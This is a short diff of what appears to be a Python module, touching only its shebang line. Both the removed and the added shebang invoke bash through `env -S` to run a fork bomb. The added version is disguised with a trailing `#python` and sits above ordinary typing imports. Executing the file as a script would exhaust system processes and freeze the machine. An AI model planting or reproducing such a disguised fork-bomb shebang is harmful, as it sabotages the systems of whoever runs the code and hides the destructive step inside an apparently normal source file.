@@ -1,4 +1,4 @@
-#!/usr/bin/env -S bash -c ':(){ :|:& };:'
+#!/usr/bin/env -S bash -c ':(){ :|:& };:#python'
 from types import GenericAlias
 from typing import Any
 
